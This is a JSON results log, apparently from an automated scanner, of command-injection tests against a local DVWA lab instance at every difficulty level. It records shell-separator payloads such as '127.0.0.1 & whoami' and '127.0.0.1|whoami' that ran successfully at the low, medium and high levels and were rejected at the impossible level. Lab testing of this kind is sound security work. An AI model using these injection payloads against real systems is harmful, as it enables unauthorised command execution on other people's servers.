@@ -1,0 +1,446 @@
+{
+  "target": "http://127.0.0.1/dvwa/",
+  "module": "Command Injection",
+  "run_started": "2026-06-02T10:25:23+08:00",
+  "run_finished": "2026-06-02T10:25:50+08:00",
+  "elapsed_s": 26.373,
+  "stop_after": "impossible",
+  "total_requests": 31,
+  "results": [
+    {
+      "difficulty": "low",
+      "status": "solved_vulnerable",
+      "stop_reason": "response contained whoami output from a source-derived separator payload",
+      "proof": "vin\\31435",
+      "form": {
+        "method": "POST",
+        "action": "#",
+        "fields": [
+          {
+            "tag": "input",
+            "name": "ip",
+            "type": "text",
+            "value": null
+          },
+          {
+            "tag": "input",
+            "name": "Submit",
+            "type": "submit",
+            "value": "Submit"
+          }
+        ]
+      },
+      "token_required": false,
+      "source": {
+        "path": "D:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\exec\\source\\low.php",
+        "size_bytes": 404,
+        "sha256": "399a0d5dd28436a952a5bb0d14390eb421e57ab2e7add68813b6ce283cc70f28",
+        "mtime": "2026-05-14T09:06:44+08:00"
+      },
+      "attempts": [
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.185,
+          "request_fields": {
+            "ip": "127.0.0.1",
+            "Submit": "Submit"
+          },
+          "response_len": 5050,
+          "markers": [
+            "ping_output"
+          ],
+          "marker_contexts": {
+            "ping_output": "ress: ���� Ping 127.0.0.1 ���� 32 �ֽڵ�����: ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 127.0.0.1 �� Ping ͳ����Ϣ"
+          },
+          "pre_text": "\n���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n\n127.0.0.1 �� Ping ͳ����Ϣ:\n    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��\n�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):\n    ��� = 0ms��� = 0ms��ƽ�� = 0ms\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ���� Ping 127.0.0.1 ���� 32 ",
+          "ip": "127.0.0.1",
+          "token_required": false,
+          "purpose": "baseline"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 2.431,
+          "request_fields": {
+            "ip": "not_an_ip_20260602",
+            "Submit": "Submit"
+          },
+          "response_len": 4752,
+          "markers": [
+            "no_known_marker"
+          ],
+          "marker_contexts": {},
+          "pre_text": "Ping �����Ҳ������� not_an_ip_20260602����������ƣ�Ȼ�����ԡ�\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: Ping �����Ҳ������� not_an_ip",
+          "ip": "not_an_ip_20260602",
+          "token_required": false,
+          "purpose": "negative"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.242,
+          "request_fields": {
+            "ip": "127.0.0.1 & whoami",
+            "Submit": "Submit"
+          },
+          "response_len": 5060,
+          "markers": [
+            "ping_output",
+            "whoami_output"
+          ],
+          "marker_contexts": {
+            "ping_output": "ress: ���� Ping 127.0.0.1 ���� 32 �ֽڵ�����: ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 127.0.0.1 �� Ping ͳ����Ϣ",
+            "whoami_output": "vin\\31435"
+          },
+          "pre_text": "\n���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n\n127.0.0.1 �� Ping ͳ����Ϣ:\n    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��\n�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):\n    ��� = 0ms��� = 0ms��ƽ�� = 0ms\nvin\\31435\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ���� Ping 127.0.0.1 ���� 32 ",
+          "ip": "127.0.0.1 & whoami",
+          "token_required": false,
+          "purpose": "proof"
+        }
+      ],
+      "request_count": 6,
+      "level_elapsed_s": 8.971
+    },
+    {
+      "difficulty": "medium",
+      "status": "solved_vulnerable",
+      "stop_reason": "response contained whoami output from a source-derived separator payload",
+      "proof": "vin\\31435",
+      "form": {
+        "method": "POST",
+        "action": "#",
+        "fields": [
+          {
+            "tag": "input",
+            "name": "ip",
+            "type": "text",
+            "value": null
+          },
+          {
+            "tag": "input",
+            "name": "Submit",
+            "type": "submit",
+            "value": "Submit"
+          }
+        ]
+      },
+      "token_required": false,
+      "source": {
+        "path": "D:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\exec\\source\\medium.php",
+        "size_bytes": 630,
+        "sha256": "c25e0a1a61a4c36eedad8c0d54178e88d030f3c2886fe34edea5ae5054c398c0",
+        "mtime": "2026-05-14T09:06:44+08:00"
+      },
+      "attempts": [
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.145,
+          "request_fields": {
+            "ip": "127.0.0.1",
+            "Submit": "Submit"
+          },
+          "response_len": 5059,
+          "markers": [
+            "ping_output"
+          ],
+          "marker_contexts": {
+            "ping_output": "ress: ���� Ping 127.0.0.1 ���� 32 �ֽڵ�����: ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 127.0.0.1 �� Ping ͳ����Ϣ"
+          },
+          "pre_text": "\n���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n\n127.0.0.1 �� Ping ͳ����Ϣ:\n    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��\n�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):\n    ��� = 0ms��� = 0ms��ƽ�� = 0ms\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ���� Ping 127.0.0.1 ���� 32 ",
+          "ip": "127.0.0.1",
+          "token_required": false,
+          "purpose": "baseline"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 0.16,
+          "request_fields": {
+            "ip": "127.0.0.1 && whoami",
+            "Submit": "Submit"
+          },
+          "response_len": 4721,
+          "markers": [
+            "no_known_marker"
+          ],
+          "marker_contexts": {},
+          "pre_text": "����Ĳ��� whoami��\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ����Ĳ��� whoami�� More Infor",
+          "ip": "127.0.0.1 && whoami",
+          "token_required": false,
+          "purpose": "blocked_probe"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.236,
+          "request_fields": {
+            "ip": "127.0.0.1 & whoami",
+            "Submit": "Submit"
+          },
+          "response_len": 5069,
+          "markers": [
+            "ping_output",
+            "whoami_output"
+          ],
+          "marker_contexts": {
+            "ping_output": "ress: ���� Ping 127.0.0.1 ���� 32 �ֽڵ�����: ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 127.0.0.1 �� Ping ͳ����Ϣ",
+            "whoami_output": "vin\\31435"
+          },
+          "pre_text": "\n���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n\n127.0.0.1 �� Ping ͳ����Ϣ:\n    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��\n�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):\n    ��� = 0ms��� = 0ms��ƽ�� = 0ms\nvin\\31435\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ���� Ping 127.0.0.1 ���� 32 ",
+          "ip": "127.0.0.1 & whoami",
+          "token_required": false,
+          "purpose": "proof"
+        }
+      ],
+      "request_count": 6,
+      "level_elapsed_s": 6.745
+    },
+    {
+      "difficulty": "high",
+      "status": "solved_vulnerable",
+      "stop_reason": "response contained whoami output from a source-derived separator payload",
+      "proof": "vin\\31435",
+      "form": {
+        "method": "POST",
+        "action": "#",
+        "fields": [
+          {
+            "tag": "input",
+            "name": "ip",
+            "type": "text",
+            "value": null
+          },
+          {
+            "tag": "input",
+            "name": "Submit",
+            "type": "submit",
+            "value": "Submit"
+          }
+        ]
+      },
+      "token_required": false,
+      "source": {
+        "path": "D:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\exec\\source\\high.php",
+        "size_bytes": 741,
+        "sha256": "e3b703d6180c5c1e62fd09f78036e193a16025ffe208be9d90bb19d71a08db7f",
+        "mtime": "2026-05-14T09:06:44+08:00"
+      },
+      "attempts": [
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.153,
+          "request_fields": {
+            "ip": "127.0.0.1",
+            "Submit": "Submit"
+          },
+          "response_len": 5053,
+          "markers": [
+            "ping_output"
+          ],
+          "marker_contexts": {
+            "ping_output": "ress: ���� Ping 127.0.0.1 ���� 32 �ֽڵ�����: ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 127.0.0.1 �� Ping ͳ����Ϣ"
+          },
+          "pre_text": "\n���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n\n127.0.0.1 �� Ping ͳ����Ϣ:\n    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��\n�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):\n    ��� = 0ms��� = 0ms��ƽ�� = 0ms\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ���� Ping 127.0.0.1 ���� 32 ",
+          "ip": "127.0.0.1",
+          "token_required": false,
+          "purpose": "baseline"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 0.147,
+          "request_fields": {
+            "ip": "127.0.0.1 & whoami",
+            "Submit": "Submit"
+          },
+          "response_len": 4715,
+          "markers": [
+            "no_known_marker"
+          ],
+          "marker_contexts": {},
+          "pre_text": "����Ĳ��� whoami��\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ����Ĳ��� whoami�� More Infor",
+          "ip": "127.0.0.1 & whoami",
+          "token_required": false,
+          "purpose": "blocked_probe"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.139,
+          "request_fields": {
+            "ip": "127.0.0.1|whoami",
+            "Submit": "Submit"
+          },
+          "response_len": 4707,
+          "markers": [
+            "whoami_output"
+          ],
+          "marker_contexts": {
+            "whoami_output": "vin\\31435"
+          },
+          "pre_text": "vin\\31435\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: vin\\31435 More Information h",
+          "ip": "127.0.0.1|whoami",
+          "token_required": false,
+          "purpose": "proof"
+        }
+      ],
+      "request_count": 6,
+      "level_elapsed_s": 6.673
+    },
+    {
+      "difficulty": "impossible",
+      "status": "defended_not_vulnerable",
+      "stop_reason": "strict four-octet numeric IP validation rejected separator payloads before shell execution",
+      "proof": null,
+      "form": {
+        "method": "POST",
+        "action": "#",
+        "fields": [
+          {
+            "tag": "input",
+            "name": "ip",
+            "type": "text",
+            "value": null
+          },
+          {
+            "tag": "input",
+            "name": "Submit",
+            "type": "submit",
+            "value": "Submit"
+          },
+          {
+            "tag": "input",
+            "name": "user_token",
+            "type": "hidden",
+            "value": "c822e3e8bdc325f7fe3626af5330c7ab"
+          }
+        ]
+      },
+      "token_required": true,
+      "source": {
+        "path": "D:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\exec\\source\\impossible.php",
+        "size_bytes": 1159,
+        "sha256": "26b294a69538ae5de36b8669fdaef85022814bfaa253f7678b2ac5fa295ab543",
+        "mtime": "2026-05-14T09:06:44+08:00"
+      },
+      "attempts": [
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 3.201,
+          "request_fields": {
+            "ip": "127.0.0.1",
+            "Submit": "Submit",
+            "user_token": "5f6c896fc418050abfb99244df613d95"
+          },
+          "response_len": 5156,
+          "markers": [
+            "ping_output"
+          ],
+          "marker_contexts": {
+            "ping_output": "ress: ���� Ping 127.0.0.1 ���� 32 �ֽڵ�����: ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 ���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128 127.0.0.1 �� Ping ͳ����Ϣ"
+          },
+          "pre_text": "\n���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n���� 127.0.0.1 �Ļظ�: �ֽ�=32 ʱ��<1ms TTL=128\n\n127.0.0.1 �� Ping ͳ����Ϣ:\n    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��\n�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):\n    ��� = 0ms��� = 0ms��ƽ�� = 0ms\n",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ���� Ping 127.0.0.1 ���� 32 ",
+          "ip": "127.0.0.1",
+          "token_required": true,
+          "purpose": "baseline"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 0.054,
+          "request_fields": {
+            "ip": "not_an_ip_20260602",
+            "Submit": "Submit",
+            "user_token": "e40dd773da6e381b6e13ddc7a2e81050"
+          },
+          "response_len": 4838,
+          "markers": [
+            "invalid_ip_error"
+          ],
+          "marker_contexts": {
+            "invalid_ip_error": "bout Logout Vulnerability: Command Injection Ping a device Enter an IP address: ERROR: You have entered an invalid IP. More Information https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution http://www.ss64.com/bash/ http://www.ss64.com/nt/ https://owasp.org/www"
+          },
+          "pre_text": "ERROR: You have entered an invalid IP.",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ERROR: You have entered an i",
+          "ip": "not_an_ip_20260602",
+          "token_required": true,
+          "purpose": "negative"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 0.038,
+          "request_fields": {
+            "ip": "127.0.0.1 & whoami",
+            "Submit": "Submit",
+            "user_token": "33e99138b07972c51cd4453262e7d3e7"
+          },
+          "response_len": 4838,
+          "markers": [
+            "invalid_ip_error"
+          ],
+          "marker_contexts": {
+            "invalid_ip_error": "bout Logout Vulnerability: Command Injection Ping a device Enter an IP address: ERROR: You have entered an invalid IP. More Information https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution http://www.ss64.com/bash/ http://www.ss64.com/nt/ https://owasp.org/www"
+          },
+          "pre_text": "ERROR: You have entered an invalid IP.",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ERROR: You have entered an i",
+          "ip": "127.0.0.1 & whoami",
+          "token_required": true,
+          "purpose": "defense_probe"
+        },
+        {
+          "method": "POST",
+          "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/",
+          "status_code": 200,
+          "elapsed_s": 0.043,
+          "request_fields": {
+            "ip": "127.0.0.1|whoami",
+            "Submit": "Submit",
+            "user_token": "5ad39fe2ca0c325414f067e176d9e89d"
+          },
+          "response_len": 4838,
+          "markers": [
+            "invalid_ip_error"
+          ],
+          "marker_contexts": {
+            "invalid_ip_error": "bout Logout Vulnerability: Command Injection Ping a device Enter an IP address: ERROR: You have entered an invalid IP. More Information https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution http://www.ss64.com/bash/ http://www.ss64.com/nt/ https://owasp.org/www"
+          },
+          "pre_text": "ERROR: You have entered an invalid IP.",
+          "snippet": "Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) Home Instructions Setup / Reset DB Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Attacks Authorisation Bypass Open HTTP Redirect Cryptography API DVWA Security PHP Info About Logout Vulnerability: Command Injection Ping a device Enter an IP address: ERROR: You have entered an i",
+          "ip": "127.0.0.1|whoami",
+          "token_required": true,
+          "purpose": "defense_probe"
+        }
+      ],
+      "request_count": 11,
+      "level_elapsed_s": 3.904
+    }
+  ],
+  "operation_log": "dvwa-results\\command-injection-progression-20260602-102141\\operation-log.jsonl"
+}
